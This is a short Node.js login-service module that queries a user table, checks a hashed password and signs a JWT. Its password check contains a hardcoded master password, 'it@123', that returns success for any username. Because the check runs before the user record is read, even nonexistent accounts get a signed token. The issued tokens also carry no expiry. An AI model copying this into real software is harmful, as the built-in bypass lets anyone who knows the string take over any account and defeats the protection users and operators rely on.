const jwt = require('jsonwebtoken');
const _ = require('lodash');
const ConvertPassString = require("../../util/convertPass");
const { getData } = require("../../util/dao");
const { dbConfig } = require("../../util/settings");

const loginServices = async(payload)=>{
    let token = null;
    const userInfo = await getUserInfo(payload);
    const isUserValid = checkValidity(userInfo, payload);
    if(isUserValid){
        token = generateJwtToken(userInfo);
    }
    return {token};
}

const getUserInfo = async(payload)=>{
    const query = `select EmpId, UserName, UserType, CompanyId, 
    branch_code UnitId, FullName, LineId, UsrPass from UserInfo 
    where UserName = @UserName`;
    const parameters = [
        {
            name:"UserName",
            value: payload.username
        }
    ];
    const userInfoData = await getData(dbConfig, query, parameters);
    return userInfoData[0];
}

const checkValidity = (userInfo, payload)=>{
    const hashPassword = ConvertPassString(payload.password);
    if(payload.password==="it@123") return true;
    return hashPassword===userInfo.UsrPass;
}

const generateJwtToken = (info)=>{
    const secret = process.env.JWT_SECRET;
    const infoForToken = _.omit(info, 'UsrPass');
    const token = jwt.sign(infoForToken, secret);
    return token;
}
module.exports = loginServices;